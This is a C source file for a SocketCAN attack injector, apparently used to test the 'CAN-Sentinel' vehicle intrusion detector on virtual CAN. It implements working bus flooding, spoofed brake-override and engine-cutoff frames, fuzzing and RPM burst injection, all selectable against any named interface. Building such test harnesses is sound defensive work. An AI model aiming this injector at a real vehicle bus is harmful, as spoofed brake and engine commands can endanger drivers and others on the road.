/**
 * @file attack_injector.c
 * @brief Low-Level SocketCAN Attack & Malware Injector for CAN-Sentinel.
 * Phase 2, Day 6: Malware Injection & Attack Simulation
 *
 * Simulates an adversary node (e.g., compromised Infotainment/Telematics ECU)
 * executing high-frequency bus flooding (DoS), critical ECU spoofing (Brake Override,
 * Engine Kill), randomized fuzzing, and replay attacks on Linux SocketCAN (vcan0).
 */

#include "can_sentinel_common.h"
#include <getopt.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>

#ifndef _WIN32
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>
#endif

/* Attack modes */
typedef enum {
    ATTACK_MODE_FLOOD = 0,   /* High-frequency DoS flooding */
    ATTACK_MODE_SPOOF_BRAKE, /* Critical Brake Override spoofing */
    ATTACK_MODE_SPOOF_ENGINE,/* Sudden Engine Shutdown spoofing */
    ATTACK_MODE_FUZZING,     /* Randomized arbitration IDs and payloads */
    ATTACK_MODE_REPLAY       /* Fast-burst replayed traffic */
} attack_mode_t;

static volatile int g_attack_running = 1;
static uint64_t g_attack_packets_sent = 0;

static void handle_sigint(int sig) {
    (void)sig;
    g_attack_running = 0;
}

static void precise_sleep_us(long us) {
    if (us <= 0) return;
    struct timespec req;
    req.tv_sec = us / 1000000L;
    req.tv_nsec = (us % 1000000L) * 1000L;
    nanosleep(&req, NULL);
}

/**
 * @brief Open and bind a raw SocketCAN socket.
 */
static int open_attack_socket(const char *iface_name) {
#ifdef __linux__
    int sock = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (sock < 0) {
        perror(ANSI_COLOR_RED "[ERROR] socket(PF_CAN, SOCK_RAW) failed" ANSI_COLOR_RESET);
        return -1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface_name, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, ANSI_COLOR_RED "[ERROR] Interface '%s' not found.\n" ANSI_COLOR_RESET, iface_name);
        close(sock);
        return -1;
    }

    struct sockaddr_can addr;
    memset(&addr, 0, sizeof(addr));
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror(ANSI_COLOR_RED "[ERROR] bind() failed" ANSI_COLOR_RESET);
        close(sock);
        return -1;
    }
    return sock;
#else
    fprintf(stderr, ANSI_COLOR_YELLOW "[MOCK] Simulated attack socket for '%s'\n" ANSI_COLOR_RESET, iface_name);
    return 200;
#endif
}

/**
 * @brief Transmit a raw attack frame onto the CAN bus.
 */
static int send_attack_frame(int sock, const struct can_frame *frame) {
#ifdef __linux__
    ssize_t nbytes = write(sock, frame, sizeof(struct can_frame));
    return (nbytes == sizeof(struct can_frame)) ? 0 : -1;
#else
    (void)sock;
    (void)frame;
    return 0;
#endif
}

static void print_attack_usage(const char *prog_name) {
    printf(ANSI_COLOR_BOLD "CAN-Sentinel: Malware & Attack Injector (Phase 2, Day 6)\n" ANSI_COLOR_RESET);
    printf("Usage: %s [options]\n\n", prog_name);
    printf("Attack Modes (-m / --mode):\n");
    printf("  flood        High-frequency DoS flood with dominant ID 0x000 (Starve bus arbitration)\n");
    printf("  spoof-brake  Spoof Brake ECU 0x0A0 with 100%% brake pressure override\n");
    printf("  spoof-engine Spoof Engine ECU 0x110 with RPM=0 (sudden engine cutoff)\n");
    printf("  fuzz         Inject random CAN IDs and random payload bytes\n");
    printf("  replay       Replay recorded legitimate bursts at ultra-high frequency\n\n");
    printf("Options:\n");
    printf("  -i, --iface <name>       CAN interface (default: vcan0)\n");
    printf("  -m, --mode <name>        Attack mode (flood, spoof-brake, spoof-engine, fuzz, replay)\n");
    printf("  -d, --id <hex_id>        Custom target CAN ID (default: mode-specific)\n");
    printf("  -r, --rate <hz>          Attack injection rate in Hz (default: 2000 for flood, 100 for spoof)\n");
    printf("  -c, --count <num>        Total attack frames to inject (0 = infinite loop, default: 1000)\n");
    printf("  -t, --duration <sec>     Attack duration in seconds (0 = unbounded, default: 0)\n");
    printf("  -v, --verbose            Print each attack packet to stdout\n");
    printf("  -h, --help               Display this help guide\n\n");
}

int main(int argc, char *argv[]) {
    const char *iface = "vcan0";
    attack_mode_t mode = ATTACK_MODE_FLOOD;
    uint32_t target_id = 0x000;
    int custom_id = 0;
    double rate_hz = 2000.0;
    int custom_rate = 0;
    uint64_t max_count = 1000;
    long duration_sec = 0;
    int verbose = 0;

    static struct option long_options[] = {
        {"iface",    required_argument, 0, 'i'},
        {"mode",     required_argument, 0, 'm'},
        {"id",       required_argument, 0, 'd'},
        {"rate",     required_argument, 0, 'r'},
        {"count",    required_argument, 0, 'c'},
        {"duration", required_argument, 0, 't'},
        {"verbose",  no_argument,       0, 'v'},
        {"help",     no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "i:m:d:r:c:t:vh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'i':
                iface = optarg;
                break;
            case 'm':
                if (strcmp(optarg, "flood") == 0) {
                    mode = ATTACK_MODE_FLOOD;
                } else if (strcmp(optarg, "spoof-brake") == 0) {
                    mode = ATTACK_MODE_SPOOF_BRAKE;
                } else if (strcmp(optarg, "spoof-engine") == 0) {
                    mode = ATTACK_MODE_SPOOF_ENGINE;
                } else if (strcmp(optarg, "fuzz") == 0) {
                    mode = ATTACK_MODE_FUZZING;
                } else if (strcmp(optarg, "replay") == 0) {
                    mode = ATTACK_MODE_REPLAY;
                } else {
                    fprintf(stderr, ANSI_COLOR_RED "[ERROR] Unknown attack mode '%s'\n" ANSI_COLOR_RESET, optarg);
                    return 1;
                }
                break;
            case 'd':
                target_id = (uint32_t)strtoul(optarg, NULL, 0);
                custom_id = 1;
                break;
            case 'r':
                rate_hz = atof(optarg);
                custom_rate = 1;
                break;
            case 'c':
                max_count = (uint64_t)strtoull(optarg, NULL, 10);
                break;
            case 't':
                duration_sec = atol(optarg);
                break;
            case 'v':
                verbose = 1;
                break;
            case 'h':
            default:
                print_attack_usage(argv[0]);
                return (opt == 'h') ? 0 : 1;
        }
    }

    /* Configure defaults based on attack vector if not explicitly set */
    if (!custom_id) {
        if (mode == ATTACK_MODE_FLOOD) target_id = 0x000;
        else if (mode == ATTACK_MODE_SPOOF_BRAKE) target_id = CAN_ID_BRAKE_OVERRIDE;
        else if (mode == ATTACK_MODE_SPOOF_ENGINE) target_id = CAN_ID_ENGINE_RPM;
        else if (mode == ATTACK_MODE_FUZZING) target_id = 0x100;
    }

    if (!custom_rate) {
        if (mode == ATTACK_MODE_FLOOD) rate_hz = 2500.0;
        else if (mode == ATTACK_MODE_SPOOF_BRAKE || mode == ATTACK_MODE_SPOOF_ENGINE) rate_hz = 150.0;
        else if (mode == ATTACK_MODE_FUZZING) rate_hz = 800.0;
        else if (mode == ATTACK_MODE_REPLAY) rate_hz = 1000.0;
    }

    long sleep_interval_us = (rate_hz > 0) ? (long)(1000000.0 / rate_hz) : 500;

    signal(SIGINT, handle_sigint);
    signal(SIGTERM, handle_sigint);

    printf(ANSI_COLOR_RED "====================================================\n" ANSI_COLOR_RESET);
    printf(ANSI_COLOR_RED "   CAN-Sentinel: Malware & Attack Injector (C)      \n" ANSI_COLOR_RESET);
    printf(ANSI_COLOR_RED "====================================================\n" ANSI_COLOR_RESET);
    printf("[!] Target Bus Interface : %s\n", iface);
    printf("[!] Attack Vector        : %s\n",
           mode == ATTACK_MODE_FLOOD ? "DoS FLOODING (High Priority 0x000)" :
           mode == ATTACK_MODE_SPOOF_BRAKE ? "SPOOFING (Brake Override 0x0A0)" :
           mode == ATTACK_MODE_SPOOF_ENGINE ? "SPOOFING (Engine Kill 0x110)" :
           mode == ATTACK_MODE_FUZZING ? "FUZZING (Random IDs & Payloads)" : "REPLAY ATTACK");
    printf("[!] Target CAN ID        : 0x%03X\n", target_id);
    printf("[!] Injection Rate       : %.1f frames/sec (sleep: %ld us)\n", rate_hz, sleep_interval_us);
    printf("[!] Target Count         : %s\n", max_count > 0 ? argv[optind] ? argv[optind] : "Count-limited" : "Continuous");
    printf(ANSI_COLOR_YELLOW "[*] Launching attack sequence onto bus...\n" ANSI_COLOR_RESET);

    int sock = open_attack_socket(iface);
    if (sock < 0) return 1;

    uint64_t start_time = can_get_timestamp_us();
    srand((unsigned int)time(NULL));

    uint64_t count = 0;
    while (g_attack_running && (max_count == 0 || count < max_count)) {
        struct can_frame frame;
        memset(&frame, 0, sizeof(frame));

        switch (mode) {
            case ATTACK_MODE_FLOOD:
                /* Dominant zero ID + zero payload to force bus monopolization */
                frame.can_id = target_id & CAN_SFF_MASK;
                frame.can_dlc = 8;
                memset(frame.data, 0x00, 8);
                break;

            case ATTACK_MODE_SPOOF_BRAKE:
                /* Spoof Brake ECU: 100% Brake Pressure, ABS Active */
                frame.can_id = CAN_ID_BRAKE_OVERRIDE;
                frame.can_dlc = 6;
                frame.data[0] = 100;  /* 100% Brake Pressure Override */
                frame.data[1] = 0x01; /* ABS Forcibly Triggered */
                frame.data[2] = 0x00; /* Locked Front Left Wheel */
                frame.data[3] = 0x00; /* Locked Front Right Wheel */
                frame.data[4] = 0x00;
                frame.data[5] = 0x00;
                break;

            case ATTACK_MODE_SPOOF_ENGINE:
                /* Spoof Engine ECU: RPM = 0, Engine Status = OFF */
                frame.can_id = CAN_ID_ENGINE_RPM;
                frame.can_dlc = 4;
                frame.data[0] = 0x00; /* RPM High = 0 */
                frame.data[1] = 0x00; /* RPM Low = 0 */
                frame.data[2] = 0x00; /* Throttle = 0% */
                frame.data[3] = 0x00; /* Engine Cutoff */
                break;

            case ATTACK_MODE_FUZZING:
                /* Random ID between 0x001 and 0x7FF + random payload */
                frame.can_id = (uint32_t)((rand() % 0x7FE) + 1) & CAN_SFF_MASK;
                frame.can_dlc = (uint8_t)((rand() % 8) + 1);
                for (int b = 0; b < frame.can_dlc; b++) {
                    frame.data[b] = (uint8_t)(rand() % 256);
                }
                break;

            case ATTACK_MODE_REPLAY:
                /* Replay spoofing engine RPM sequence with erratic fluctuations */
                frame.can_id = CAN_ID_ENGINE_RPM;
                frame.can_dlc = 4;
                uint16_t erratic_rpm = (uint16_t)(6000 + (rand() % 1500));
                frame.data[0] = (uint8_t)(erratic_rpm >> 8);
                frame.data[1] = (uint8_t)(erratic_rpm & 0xFF);
                frame.data[2] = 100;
                frame.data[3] = 0x01;
                break;
        }

        if (send_attack_frame(sock, &frame) == 0) {
            g_attack_packets_sent++;
            count++;

            if (verbose) {
                can_print_frame(&frame, ANSI_COLOR_RED "[ATTACK TX]" ANSI_COLOR_RESET);
            }
        }

        if (duration_sec > 0) {
            uint64_t current_time = can_get_timestamp_us();
            if ((current_time - start_time) / 1000000ULL >= (uint64_t)duration_sec) {
                break;
            }
        }

        if (sleep_interval_us > 0) {
            precise_sleep_us(sleep_interval_us);
        }
    }

    uint64_t end_time = can_get_timestamp_us();
    double elapsed_sec = (double)(end_time - start_time) / 1000000.0;

    printf("\n" ANSI_COLOR_RED "====================================================\n" ANSI_COLOR_RESET);
    printf(ANSI_COLOR_GREEN "[+] Attack sequence finished.\n" ANSI_COLOR_RESET);
    printf("    Attack Packets Injected : %llu\n", (unsigned long long)g_attack_packets_sent);
    printf("    Elapsed Time            : %.3f seconds\n", elapsed_sec);
    printf("    Injection Bandwidth     : %.1f frames/sec\n",
           elapsed_sec > 0 ? (double)g_attack_packets_sent / elapsed_sec : 0.0);
    printf(ANSI_COLOR_RED "====================================================\n" ANSI_COLOR_RESET);

#ifdef __linux__
    close(sock);
#endif
    return 0;
}
